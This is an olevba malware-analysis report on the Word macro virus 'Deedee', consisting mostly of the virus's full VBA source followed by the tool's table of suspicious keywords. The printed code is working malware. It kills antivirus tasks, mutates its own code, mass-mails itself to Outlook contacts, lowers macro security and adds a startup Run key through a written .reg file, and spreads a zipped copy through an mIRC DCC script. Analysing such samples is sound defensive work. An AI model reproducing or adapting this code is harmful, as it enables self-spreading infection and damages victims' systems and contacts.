olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Deedee-36153d72885e1301086e26e654b575c659e7725d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Deedee-36153d72885e1301086e26e654b575c659e7725d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
Sub Document_Open() 'fƒ„'XB/'�T%
On Error Resume Next ')<+'5“}'Mi.
NQDMp = Day(Date) 'r†5'%^–'0Œ€
If NQDMp = 23 Then 'p"Œ'…nX'T{e
MsgBox Chr(34) + Chr(100) + Chr(105) + Chr(101) + Chr(32) + Chr(100) + Chr(105) + Chr(101) + Chr(32) + _
Chr(100) + Chr(105) + Chr(101) + Chr(34) + Chr(32) + Chr(45) + Chr(91) + Chr(100) + Chr(105) + Chr(101) + _
Chr(51) + Chr(93) + Chr(45) + Chr(32) + Chr(98) + Chr(121) + Chr(32) + Chr(77) + Chr(73) + Chr(95) + Chr(112) + _
Chr(105) + Chr(114) + Chr(97) + Chr(116), vbInformation, Chr(100) + Chr(105) + Chr(101) + Chr(51) + Chr(32) + _
Chr(86) + Chr(105) + Chr(114) + Chr(117) + Chr(115) '3h|'—X+'P&”
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", "Wallpaper") = "C:\Windows\setup.bmp"
ShowCursor 0 ';su'\4P'%"Q
End If 'c~Y'2—Œ'[‰Y
For DBDMp = 1 To Tasks.Count '9|='�Q&'K‡L
If InStr(1, Tasks(DBDMp).Name, "av", vbTextCompare) Or InStr(1, Tasks(DBDMp).Name, "AV", vbTextCompare) Then
Tasks(DBDMp).Close '+m‰'W1`']&p
End If '” ”'Z G'\q+
Next DBDMp '&Ds'ˆ(s'8?i
If ThisDocument.FullName <> Templates(1).FullName Then '–�-',?-'‹;.
NQDMp = 16 '7•z'>o-'VL-
ReDim NRRMp(1 To NQDMp) As String '\vf'2eh'ƒ`|
NRRMp(1) = "NQDMp": NRRMp(2) = "PNIMp": NRRMp(3) = "NRRMp": NRRMp(4) = "LXHMp" 'nˆn'|!z'.MO
NRRMp(5) = "LXDMp": NRRMp(6) = "DBDMp": NRRMp(7) = "KCXMp": NRRMp(8) = "TUAMp" '’@0' #)'Š—J
NRRMp(9) = "YRWMp": NRRMp(10) = "BKSMp": NRRMp(11) = "OWLMp" '{._';…$'ŒL�
NRRMp(12) = "DFXMp": NRRMp(13) = "TNEMp": NRRMp(14) = "YPVMp": NRRMp(15) = "AWDMp": NRRMp(16) = "CGTMp"
Set KCXMp = ActiveDocument.VBProject.VBComponents(1).CodeModule 'Ejo'}>k'KzR
For DBDMp = 1 To NQDMp '|8H'CLk'#…7
Randomize 'g%Y'E%‘'q€+
LXDMp = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "Mp" 'ZXs
For PNIMp = 2 To KCXMp.CountOfLines 'ŒF„'kO„'�Hk
TUAMp = KCXMp.Lines(PNIMp, 1) '7ˆ>'v6J'\Da
If InStr(1, TUAMp, NRRMp(DBDMp), vbTextCompare) Then '�;2'E\O'+*Š
TUAMp = Replace(TUAMp, NRRMp(DBDMp), LXDMp, 1, -1, vbTextCompare) '\!'=I_'' =
KCXMp.ReplaceLine PNIMp, TUAMp '�,r'4jI'"/s
End If '…&&'P:q'}…i
Next PNIMp ', c'€R>'i4\
Next DBDMp 'ƒ7|'i4%'P0(
For DBDMp = 2 To KCXMp.CountOfLines 'S#T'QBŽ'f(r
TUAMp = KCXMp.Lines(DBDMp, 1) 'yhL't—/'*‚t
If Len(TUAMp) <= 100 Then ' [A'†}Q'–€&
TUAMp = TUAMp + "'" + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
KCXMp.ReplaceLine DBDMp, TUAMp '‰2C'=tŠ'-u"
End If 'MF‡'Jƒ’'S4B
Next DBDMp 'AH‘'PC'C„Y
End If 'ww/'Œ73'“sn
Dim YRWMp, BKSMp, OWLMp 'P+o'q%q'@0€
Set YRWMp = CreateObject("Outlook.Application") '^”V'D|c'n\“
Set BKSMp = YRWMp.GetNameSpace("MAPI") 'md–'&oZ'"<D
If YRWMp = "Outlook" Then '+�U':‚B'/$‰
BKSMp.Logon "profile", "password" 'd”n''Ue'e–k
Set DFXMp = BKSMp.AddressLists 'Md†'”Mi'��‡
For DBDMp = 1 To DFXMp.Count 'i“{'—>2'o!s
Set ABook = BKSMp.AddressLists(DBDMp) 'wŠo'l-h'iIM
TNEMp = 1 'DS''Dƒ‚'aY~
Set YPVMp = ABook.AddressEntries 'eU^'‡i‘'7Œ2
Set OWLMp = YRWMp.CreateItem(0) 'ZZY'p”c'u…–
For CGTMp = 1 To YPVMp.Count 'V‡%'^‡‹'.[w
AWDMp = YPVMp(TNEMp) 'Ž’,'cV\'†8U
OWLMp.Recipients.Add AWDMp 'N!m'†?…']†S
TNEMp = TNEMp + 1 'L€M'1|;'D`=
If TNEMp > 20 Then NQDMp = YPVMp.Count '”Rƒ'$`’', b
Next CGTMp '–C7'„•m'*,s
OWLMp.Subject = "hello!!!" 'YNH'(P~'qMZ
OWLMp.Body = "Cool jokes (more in the doc.) " 'kz,'ŽId'!cV
OWLMp.Attachments.Add ActiveDocument.FullName '}wR'h€'Ef‰
OWLMp.Send 'Q3Ž'“i['jw‚
AWDMp = "" '$:%'–&T' &A
Next DBDMp 'j6F'–�H'‰•�
BKSMp.Logoff 'L$"'nE='Z•v
End If '‚.B'ur%'‚u‹
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") <> "inXP" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") = "inXP" '!†9'~)ƒ
Options.SaveNormalPrompt = 5 Xor 5 't–`'-KC'XG5
CommandBars(Chr(84) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Enabled = (1 Xor 1)
Open "C:\a.reg" For Output As #1 'iQK'h{{'wX
Print #1, "REGEDIT4" '2{4'AF†'J�•
Print #1, "" 'rl8'•O�'SZ`
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]" 'TN='Mi/'PqV
Print #1, """Level"" = dword:00000001" 'Ut�')7k'w~Œ
Print #1, """AccessVBOM"" = dword:00000001" 'a2)'�T*'…b_
Print #1, "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]" 'Vc['>NE'?B•
Print #1, """doc"" = " + """" + ActiveDocument.FullName + """" ',]D'—;i'D#–
Close #1 '€‚j'Qa;'0A—
Shell "C:\Windows\regedit /s C:\a.reg" 'PY1'Š—‚'j…e
Kill "C:\a.reg" 'Š-)'f_2'/MJ
Randomize 'P1X'J<''“UA
LXDMp = ActiveDocument.FullName '~4Z'NS�'Q�0
TUAMp = "C:\" + Chr(Int((25 * Rnd) + 65)) + ".zip" '”H'eXd'|XB
scr = "C:\" + Chr(Int((25 * Rnd) + 65)) + ".doc" '!K1'iOZ' b=
ActiveDocument.SaveAs scr 'Z„I'DC“'ƒ%o
ActiveDocument.SaveAs LXDMp '&PN'77ƒ'U„N
LXDMp = Application.System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" & _
"\CurrentVersion\App Paths\winzip32.exe", "") '',’'”e,'~…i
Shell LXDMp & " -a -r " & TUAMp & Chr(32) & scr, vbHide 'ŠL–'9zq'R…X
LXDMp = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\mIRC\", "UninstallString")
LXDMp = Mid(LXDMp, 2, Len(LXDMp) - 23) '01S'r �'g3‚
Open LXDMp + "script.ini" For Output As #1 'bRb's8%'5}Ž
Print #1, "[Script]" 'j–I'FAY'†PT
Print #1, "n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }" 'Ky6'O#1'7^3
Print #1, "n1=/dcc send $nick " & Chr(34) & TUAMp & Chr(34) 'B8\'7b‰')~Z
Print #1, "n2=}" 'Mgƒ'ˆR‹'Gk8
Close #1 '3%Ž'& I'?2�
NQDMp = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines '2a$'O’J'EG#
Set KCXMp = Templates(1) 'y^9'HaN'F9U
KCXMp.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, myTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
KCXMp.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Sub Document_Close" '–=6'i2i'Z�N
For DBDMp = 2 To NQDMp '��M'Ž0\':[(
TUAMp = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1) '/I:'#]''+“�
KCXMp.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, TUAMp '5"•'0V'“–z
Next DBDMp 'iL`'l11'PC$
KCXMp.Save 'Ny4'Wyo'z9r
End If '…ms'E+'m€n
NQDMp = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines 'LK%'’MK'„'>
If Not ((NQDMp < 130) And (NQDMp > 127)) Then 'Žo~'}‡H']�–
Set KCXMp = Templates(1) '$M>'pea'!„P
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, NQDMp 'MTŽ'E�d']�’
TUAMp = KCXMp.VBProject.VBComponents(1).CodeModule.Lines(1, 1) 'lT‹'q‚‰'�:@
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, TUAMp '�u+'T!7'y,e
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 2, "Sub Document_Open" 'c>)'ŠA.'t0&
NQDMp = KCXMp.VBProject.VBComponents(1).CodeModule.CountOfLines 'G*<'At‰'h=Š
For i = 3 To NQDMp 'o9'PPn'‘yj
TUAMp = KCXMp.VBProject.VBComponents(1).CodeModule.Lines(i, 1) '=ZV'IMf'ga!
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines i, TUAMp '18€'—‹7'‰”E
Next i '1Tc'“k”'K3G
ActiveDocument.Save 'M|x'M^Œ'�K†
End If 'J,[']†#'NY)
End Sub '0r~'ƒh:'…@]
'o2A'?R>'61{
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |a.reg               |Executable file name                         |
|IOC       |winzip32.exe        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
